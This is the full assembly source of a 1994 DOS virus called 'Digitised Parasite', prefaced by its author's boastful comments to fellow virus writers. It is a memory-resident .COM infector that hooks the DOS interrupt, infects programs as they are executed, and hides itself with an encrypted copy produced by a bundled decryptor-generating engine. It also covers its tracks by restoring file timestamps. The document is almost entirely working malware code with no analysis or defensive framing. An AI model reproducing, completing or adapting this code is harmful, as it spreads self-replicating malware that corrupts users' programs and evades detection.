comment %

Digitised Parasite
Heyup, dudes, I added the "Weiners XOR machine" that I've been working on,
it sucks and DF keeps telling me that, but hey, it polymorphs right?
right guys?  HEhehehe, pixy, wheres my disassembly you promised me?
and no more cracks bout the "WXM" i finished it and it works, so fuck me all
you lazy sods!

Well, so it's not really, polymorphic, but it does make from scratch a
decryptor, okey, okey, so shaddup already ;)

Vir_tit: Digitised Parasite
Variant: 5th "Australian Parasite"
 Author: Australian Parasite [AIH]
 Origin: Australia
 Length: A whopping 971bytes
  Issue: Resident .COM infector on EXEC
   Date: Completion in June 1994

%

VERS EQU 5

MAIN:
CALL X0

X0:
MOV BP,SP
MOV DI,0100
XCHG W[BP],DI
SUB DI,0103
MOV BP,0100
XCHG DI,BP

LEA SI,[BP+OLD3]
MOVSW
MOVSB

MOV AX,02B44
INT 21H
CMP AH,VERS
JNE GO_MEM
RET

GO_MEM:
MOV CX,PARGS            ;AMOUNT OF MEMORY
MOV DX,CS
DEC DX
MOV ES,DX
MOV DX,W[2]             ;SUB IT FROM CURRENT PSP
SUB DX,CX
ES: SUB W[3],CX         ;SUB IT FROM OVERALL MEM
MOV W[2],DX

XOR DI,DI
MOV ES,DX
LEA SI,[BP+0100]

PUSH CS
POP DS

MOV AX,03521 - BUFLEN

MOV CX,BUFLEN

ADD AX,CX

REP MOVSB
PUSH ES
POP DS
INT 21H
MOV W[OFFSET JUMP+3-0100],ES
MOV W[OFFSET JUMP+1-0100],BX
MOV DX,INT21H-0100
MOV AX,02521 - (INT21H-0100)
ADD AX,DX
INT 21H

PUSH CS,CS
POP ES,DS
RET

db "The Digitised Parasite : Australian Parasite [AIH]"

INT21H:
PUSHF
PUSH AX

ADD AH,AH
CMP AH,04B+04B

POP AX
JE DO_IT

POPF

CMP AX,02B44
JNE JUMP

MOV AH,VERS
IRET

JUMP: JMP 0000:0000

DO_IT:
push ax,bx,cx,dx,si,di,bp,es,ds

;open file
MOV AX,03D02
INT 21H
JNC X1

JMP DO_RET

X1:
;save handle
MOV BX,AX

PUSH CS,CS
POP ES,DS

;save the first 3 bytes
MOV AH,03F
MOV CX,3
MOV DX,OFFSET OLD3-0100
INT 21H

MOV SI,DX
ADD DX,"ZM" - OFFSET (OLD3-0100)
CMP W[SI],DX
JE DO_RETS

;move pointer to end of file to get size
MOV AX,04202
XOR CX,CX
XOR DX,DX
INT 21H

SUB AX,3
MOV W[OFFSET HOST-0100],AX

MOV AX,04202
MOV CX,-1
MOV DX,0-MLEN
INT 21H

MOV DX,ENDV-0100
MOV CX,MLEN
MOV AH,03F
INT 21H

MOV SI,DX
MOV DI,MARKER-0100
REP CMPSB
JE DO_RETS

;get date & time
MOV AX,05700
INT 21H
PUSH CX
PUSH DX

PUSH BX

MOV AX,W[OFFSET HOST-0100]
ADD AX,0103
MOV BX,BUFLEN
XOR SI,SI
MOV DI,OFFSET ENDV-0100
CALL POLY

POP BX
MOV AH,040
INT 21H

MOV AH,040
MOV CX,MLEN
MOV DX,OFFSET MARKER-0100
INT 21H

MOV AX,04200
XOR CX,CX
XOR DX,DX
INT 21H

MOV CL,3
MOV DX,OFFSET JUMPS-0100
MOV AH,040
INT 21H

POP DX
POP CX
MOV AX,05701
INT 21H

DO_RETS:
MOV AH,03E
INT 21H

DO_RET:
POP DS,ES,BP,DI,SI,DX,CX,BX,AX
POPF
JMP JUMP

;==============================================================================
;call Poly with
;   AX = Delta offset
;   BX = Length of code to encrypt
;DS:SI = Offset of code to encrypt
;ES:DI = Buffer offset of where to put cryption routine
;returns
;cx = total length to write
;ds:dx = 32bit offset of where code is

db "Weiners XOR machine 1.0 (C) Australian Parasite [AIH] June 1994"

;With some thanks to Vibrant Pixel and Digital Vampyr

Poly:
enter 22,0                       ;80286 inst only ;)

mov w[bp-20],CX
mov w[bp-22],si
mov w[bp-16],di
mov w[bp-4],ax                  ;Save Encryption Offset
mov w[bp-6],bx                  ;Save Length to encrypt
add ax,bx
add w[bp-10],ax                 ;Add some to the random seed

call poly_flood_buffer
call poly_make_register
call poly_regnum                   ;Set regnum seed
call poly_pointer_set              ;Set the encryption delta offset
call poly_count_set
call poly_get_byte
call poly_crypt_byte
call poly_set_byte
call poly_inc_data
call poly_dec_counter
call poly_calc_loop

mov ax,w[bp-16]
sub di,ax
mov w[bp-18],di

call poly_fix_delta

;copy code to end of cryption routine

mov cx,w[bp-6]
mov si,w[bp-22]
mov di,w[bp-16]
add di,w[bp-18]
rep movsb

mov cx,w[bp-6]
mov si,w[bp-16]
add si,w[bp-18]

mov dx,w[bp-8]

l1:
xor b[si],dl
inc si
loop l1

push es
pop ds

mov dx,w[bp-16]
mov cx,w[bp-18]
add cx,w[bp-6]

leave                           ;Whoooo, another 80286+ only;
                                ;kill our scratch buffer
ret

poly_fix_delta:
mov di,w[bp-14]
mov ax,w[bp-18]
inc di
add w[di],ax
ret

poly_regnum:
test dl,0100xb
je ret
mov w[bp-8],di                  ;Yes, then do this
mov ax,0b0
stosw
ret


poly_make_register:
call poly_rand_byte
and al,0111xb
mov dh,al
;dh = main data get\put register. one of 8 registers

l1:
call poly_rand_byte
and al,0111xb
mov dl,al
cmp dh,dl
je l1
;dl = encryption register. one of 7 registers

l1:
; DH              AL
; 0000  AL        0000  AX              a# = 0000 or 0100 so it == 00
; 0001  CL        0001  BX
; 0010  DL        0010  CX      ;notice in AX + CX that bottom bit is off
; 0011  BL        0011  DX      ;and in AL+CL the second bit is off
; 0100  AH
; 0101  CH
; 0110  DH
; 0111  BH

;convert byte reg to word reg
call poly_rand_byte
and al,0011xb           ;DOES BOTTOM 2 BITS

mov ah,dh
and ah,0011xb
cmp ah,al
je l1

mov ah,dl
and ah,0011xb
cmp ah,al
je l1

shl dl,4
or dl,al

;shl 1 and compare the two top bits
;00 = AX = AL,AH
;01 = CX = CL,CL
;10 = DX = DL,DL
;11 = BX = BL,BL

call poly_rand_byte
and al,0001xb
shl al,2
or dl,al

call poly_rand_word
aad
and al,1
shl al,3
or dl,al

;dll = counter reg                      xxxx xx11 = reg
;dll = reg or num, 1 = reg to reg       xxxx x1xx = flag
;                  0 = reg to num
;dll = data pointer                     xxxx 1xxx = Pointer reg SI or DI
;                  0 = SI
;                  1 = DI
;dlh = encryption reg                   x111 xxxx = reg
;dhl = getput reg                       xxxx x111 = reg

ret


poly_get_byte:
mov ah,dh
and ah,0111xb
shl ah,3
add ah,4

test dl,01000xb
je >l1
add ah,1
l1:
mov al,08a
stosw
ret

poly_set_byte:
mov ah,dh
and ah,0111xb
shl ah,3
add ah,4

test dl,01000xb
je >l1
add ah,1
l1:
mov al,088
stosw
ret

poly_count_set:
mov al,dl
and al,0011xb
add al,0b8
stosb
mov ax,w[bp-6]
stosw
mov w[bp-2],di                  ;Save delta
ret


poly_crypt_byte:
;this the bash the databyte with the cryptreg\num
;so its got to be a XOR #l\h, #l\h
; or                XOR #l\h, ##
; or                xor [#i], #l\h                ;* never produced
; or                xor [#i], ##                  ;* never produced

test dl,0100xb
jne >l1

;do reg to num conversions
;crypt reg with number
;do the xor #l\h, ##

call poly_rand_byte
mov ah,al

mov al,dh
and al,0111xb
or al,al
jne >l2

;its a straight al
mov al,034
stosw
ret

l2:
add al,0f0
mov ah,080
xchg al,ah
stosw
call poly_rand_word
stosb
jmp >l2


l1:
;bit is on, so do reg to reg conversions
;crypt reg with random register
mov bh,dh
and bh,0111xb

mov al,dl
shr al,4
shl al,3
add bh,al
add bh,0c0

xchg ax,bx

mov al,030
stosw

;now fix the reg2reg rndnumber
mov bx,di
mov di,w[bp-8]
mov ah,dl
shr ah,4
add ah,0b0
call poly_rand_byte
xchg al,ah
stosw
mov di,bx
xchg al,ah

l2:
;al = the cypher byte
mov w[bp-8],ax
ret


poly_pointer_set:
mov w[bp-14],di

mov al,0be
test dl,001000xb
je >l1

inc al

l1:
stosb
mov ax,w[bp-4]
stosw
ret

poly_inc_data:
;data reg pointer is stored in
;dh = xx1x   0 = si, 1 = di

xor ax,ax
test dl,001000xb
je >l1

inc ah

l1:
call poly_rand_byte

test al,00010xb
je >l1

add ah,046
xchg al,ah
stosb
jmp >l2

l1:
mov al,083
add ah,0c6
stosw
mov al,1
stosb

l2:
ret

poly_dec_counter:
;counter is stored in dll
;counter is ALWAYS a WORD register
mov ah,dl
and ah,0011xb

call poly_rand_byte

test al,1
jne >l1

;do DEC ##
xchg al,ah
add al,048
jmp >l3

l1:
;do SUB ##,1
or ah,ah
je >l1

mov al,083
add ah,0e8
stosw
mov al,1
jmp >l3

l1:
mov ax,012d
stosw
mov al,0

l3:
stosb

l2:
ret

poly_calc_loop:
;work it on a j statement

;loop while not 0 =
; JNZ = 075
; JG  = 07F
; JA  = 077

mov bx,di
sub bx,w[bp-2]

call poly_rand_byte
and al,0011xb           ;We onlt need 3 inst.....

xchg bl,bh
mov bl,075
dec al
js >l1

mov bl,077
dec al
je >l1
mov bl,07f

l1:
xchg ax,bx
not ah
dec ah
stosw
ret

poly_flood_buffer:
push si,ds,di
mov cx,w[bp-6]

xor si,si
mov ax,0162
mov ds,ax
rep movsb

pop di,ds,si
ret

poly_rand_byte:
mov w[bp-12],ax
call poly_rand_word
mov ah,b[bp-11]
ret

poly_rand_word:
push bx,cx,dx

in ax,040
add ax,w[bp-10]
mov bx,037
mul bx
mov bx,0127
div bx
add ax,dx
add w[bp-10],ax

pop dx,cx,bx
ret

JUMPS: DB 0E9
HOST: DW 0000

OLD3: DB 0C3,0C3,0C3

MARKER: DB "Australian Parasite"
MLEN EQU $ - MARKER

ENDV:
BUFLEN EQU ENDV-0100

PARGS EQU ((BUFLEN/16)+2) * 2

